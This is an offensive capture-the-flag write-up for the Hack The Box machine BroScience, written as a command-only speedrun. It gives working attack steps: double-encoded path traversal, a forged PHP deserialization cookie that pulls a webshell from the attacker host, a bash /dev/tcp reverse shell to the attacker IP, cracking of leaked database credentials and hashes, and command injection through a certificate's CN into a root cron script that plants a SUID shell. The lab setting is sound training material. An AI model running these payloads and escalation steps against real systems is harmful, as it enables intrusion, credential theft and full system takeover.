---
title: "BroScience — Speedrun"
summary: "The command chain only. Traversal to source, forged activation code, object injection to webshell, cracked hash to bill, cron command injection to root."
date: 2026-09-06
draft: false
tier: speedrun
aliases:
  - /writeups/speedrun/broscience/
  - /writeups/broscience-speedrun/
categories:
  - Offensive
tags:
  - BroScience
  - Hack The Box
  - Linux
  - Web
  - PHP
  - Deserialization
  - Command Injection
ShowToc: true
TocOpen: false
---

Commands and output, one line per step. The reasoning, the dead ends, and why each pivot was chosen are in the [long version]({{< relref "/work/writeups/offensive/broscience" >}}).

Target: `10.129.228.129`, attacker: `10.10.14.247`.

## Recon

```bash
nmap -p- --min-rate 10000 -T4 -oA nmap/allports 10.129.228.129
nmap -sC -sV -p 22,80,443 -oA nmap/detail 10.129.228.129
```

```text
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1
80/tcp  open  http     Apache httpd 2.4.54    -> redirects to https://broscience.htb/
443/tcp open  ssl/http Apache httpd 2.4.54    ssl-cert CN=broscience.htb
```

```bash
echo "10.129.228.129 broscience.htb" | sudo tee -a /etc/hosts
```

Web tier is the only surface.

## Foothold

**1. Arbitrary file read.** Rendered HTML shows every image served through `/includes/img.php?path=`. Single encoding is filtered; double encoding is not.

```http
GET /includes/img.php?path=..%25%32%66..%25%32%66..%25%32%66..%25%32%66etc%25%32%66passwd
```

```text
postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
bill:x:1000:1000:,,,:/home/bill:/bin/bash
```

**2. Read the source.** `img.php` sits in `/includes/`, so one `..%252F` reaches the web root.

```http
GET /includes/img.php?path=..%252Flogin.php
GET /includes/img.php?path=..%252Fregister.php
GET /includes/img.php?path=..%252Fincludes%252Fdb_connect.php
GET /includes/img.php?path=..%252Fincludes%252Futils.php
```

**3. Credentials from `db_connect.php`.**

```php
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";
```

**4. Two bugs in `utils.php`.**

```php
srand(time());                                  // activation code is seedable
$up = unserialize(base64_decode($up_cookie));   // user-prefs cookie, no allowlist

class AvatarInterface {
    public $tmp; public $imgPath;
    public function __wakeup() {                // fires on unserialize
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);                   // fwrite(fopen($imgPath,"w"), file_get_contents($tmp))
    }
}
```

From `register.php`: `md5($db_salt . $password)` and `activate.php?code=`.

**5. Register, and keep the `Date:` header from the response.**

```http
POST /register.php HTTP/1.1
Host: broscience.htb
Content-Type: application/x-www-form-urlencoded

username=hacker&email=hacker@broscience.htb&password=hacker&password-confirm=hacker
```

```text
Date: Fri, 05 Jun 2026 16:21:48 GMT
```

**6. Generate the 11 candidate codes.** Pass the header string to `strtotime()`.

```php
<?php
$base = strtotime("Fri, 05 Jun 2026 16:21:48 GMT");
$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
for ($t = $base - 5; $t <= $base + 5; $t++) {
    srand($t);
    $code = "";
    for ($i = 0; $i < 32; $i++) { $code .= $chars[rand(0, strlen($chars) - 1)]; }
    echo "$t : $code\n";
}
```

```bash
php crack.php | grep ' : ' | awk '{print $3}' > activ.txt      # 11 candidates
ffuf -w activ.txt -u "https://broscience.htb/activate.php?code=FUZZ" -k -mc all -fs 0
```

One hit. Log in as `hacker:hacker`.

**7. Build the gadget cookie.**

```php
<?php
class AvatarInterface { public $tmp; public $imgPath; }
$o = new AvatarInterface();
$o->tmp     = "http://10.10.14.247:8000/shell.php";
$o->imgPath = "/var/www/html/shell.php";
echo base64_encode(serialize($o)) . "\n";
```

```text
TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czozNDoiaHR0cDovLzEwLjEwLjE0LjI0Nzo4MDAwL3NoZWxsLnBocCI7czo3OiJpbWdQYXRoIjtzOjIzOiIvdmFyL3d3dy9odG1sL3NoZWxsLnBocCI7fQ==
```

Percent-encode `+` `/` `=` as `%2B` `%2F` `%3D` before sending, or Ctrl+U the value in Repeater.

**8. Serve the payload and fire it.** Send to a page that *reads* the theme. `themeswitch.php` writes the cookie and destroys the payload.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 8000
```

```http
GET /index.php HTTP/1.1
Host: broscience.htb
Cookie: PHPSESSID=<activated session>; user-prefs=TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7...
```

**9. Shell.**

```bash
curl -sk "https://broscience.htb/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

nc -lvnp 4444
```

```http
GET /shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.247/4444+0>%261' HTTP/1.1
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then: stty raw -echo; fg
```

## Privilege escalation

**10. Dump the users table** with the credentials from step 3.

```bash
psql "host=localhost port=5432 dbname=broscience user=dbuser password=RangeOfMotion%777"
```

```sql
select * from users;
```

```text
  2 | bill | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb
```

**11. Crack it.** `md5($salt . $pass)` is hashcat mode 20, salt after the hash.

```bash
echo '13edad4932da9dbb57d9cd15b66ed104:NaCl' > hash.txt
hashcat -m 20 hash.txt /usr/share/wordlists/rockyou.txt
# 13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym

ssh bill@broscience.htb
cat /home/bill/user.txt
```

**12. Find the root cron job.** `sudo -l`, `crontab -l`, the SUID sweep and `getcap -r /` all come back empty. pspy catches it.

```bash
# attacker
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
python3 -m http.server 8000

# target
cd /tmp && wget http://10.10.14.247:8000/pspy64 && chmod +x pspy64 && ./pspy64
```

```text
UID=0   /bin/bash /opt/renew_cert.sh /home/bill/Certs/broscience.crt
UID=0   openssl x509 -in /home/bill/Certs/broscience.crt -noout -checkend 86400
```

**13. The injectable line** in `/opt/renew_cert.sh`, world-readable:

```bash
commonName=$(echo ${commonName:5} | awk -F, '{print $1}')
...
/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
```

`$commonName` comes from a certificate bill controls, unquoted into `bash -c`.

**14. Build a certificate that expires inside 24 hours**, so `-checkend 86400` fails and the script proceeds. Command substitution in the CN.

```bash
cat > /tmp/oc.cnf <<'CNF'
[req]
distinguished_name = dn
prompt = no

[dn]
CN = $(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)
CNF

mkdir -p /home/bill/Certs
openssl req -x509 -newkey rsa:2048 -nodes -keyout /tmp/k.key -out /tmp/evil.crt -days 1 -config /tmp/oc.cnf
cp /tmp/evil.crt /home/bill/Certs/broscience.crt
```

**15. Wait for cron, then use the SUID shell.** `-p` stops bash dropping the effective UID.

```bash
ls -la /tmp/rootbash        # -rwsr-sr-x root root
/tmp/rootbash -p
id
# uid=1000(bill) gid=1000(bill) euid=0(root) egid=0(root)
cat /root/root.txt
```

## Chain summary

1. `img.php?path=` accepts double-encoded traversal: arbitrary file read.
2. Read `/etc/passwd`: `bill` is the only user with a shell.
3. Read the application source through the same primitive.
4. `db_connect.php` gives the Postgres credentials and the global salt `NaCl`.
5. `utils.php` gives `srand(time())` and an `unserialize()` on the `user-prefs` cookie.
6. Register an account; the response `Date:` header is the PRNG seed.
7. Generate 11 candidate activation codes, ffuf them, activate the account.
8. Serialize `AvatarInterface` with a remote `tmp` and a web-root `imgPath`.
9. Send it as `user-prefs` to a page that reads the theme; `__wakeup()` writes the webshell.
10. `shell.php?cmd=` gives `www-data`; upgrade to a reverse shell.
11. Dump `users`, crack bill's salted MD5 (hashcat mode 20) to `iluvhorsesandgym`.
12. SSH as bill; pspy shows root running `/opt/renew_cert.sh` against a cert in bill's home.
13. Unquoted `$commonName` reaches `bash -c`; put command substitution in the CN.
14. Certificate expires in 24h so the renewal fires; cron runs the payload as root.
15. `/tmp/rootbash -p` gives root.
